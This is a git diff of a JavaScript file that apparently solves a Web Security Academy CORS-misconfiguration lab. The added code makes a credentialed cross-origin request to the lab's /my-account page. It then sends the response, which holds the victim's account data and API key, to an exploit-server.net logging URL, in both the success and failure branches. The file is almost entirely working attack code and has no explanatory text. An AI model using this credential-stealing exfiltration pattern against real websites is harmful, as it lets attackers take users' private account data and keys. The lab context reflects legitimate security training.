@@ -9,22 +9,21 @@ function sendRequest(){
     var xhttp = new XMLHttpRequest();
     xhttp.onreadystatechange= function(){
 
-        if(this.readyState==4 && this.status==200){
+        if(XMLHttpRequest.DONE==xhttp.readyState){
            console.log("*********************")
            console.log(this.responseText)
-            // var xhttp1 = new XMLHttpRequest();
-            // xhttp1.open("GET","https://exploit-0a34008204fdf1ffc03236f20180003b.exploit-server.net/exploit"+ "aaaaaaaaaaaaaaaaaaaa",true);
-          //  xhttp1.open("GET","http://127.0.0.3:8085/s/"+ document.getElementById("apikey"),true);
-  //  xhttp1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+            var xhttp1 = new XMLHttpRequest();
+            xhttp1.open("GET","https://exploit-0a29000d040ec59fc0917c1b01c100a1.exploit-server.net/log?key="+ "yesssssssssssss"+xhttp.responseText,true);
    xhttp1.send("hhh");
         }else{
-            console.log("*********************"+this.status)
-            console.log(this.responseText)
+             var xhttp1 = new XMLHttpRequest();
+             xhttp1.open("GET","https://exploit-0a29000d040ec59fc0917c1b01c100a1.exploit-server.net/log?key="+ "nooooooooooooo"+xhttp.responseText,true);
+             xhttp1.send("hhh");
         }
 
     }
    // xhttp.open("GET","https://cors-misconfig-3112.herokuapp.com/",true);
-  xhttp.open("GET","http://127.0.0.1:502/users/",true);
+  xhttp.open("GET","https://0a11007a04b0c5fdc0067c6700fa0027.web-security-academy.net/my-account",true);
 
   xhttp.withCredentials=true;
     //xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
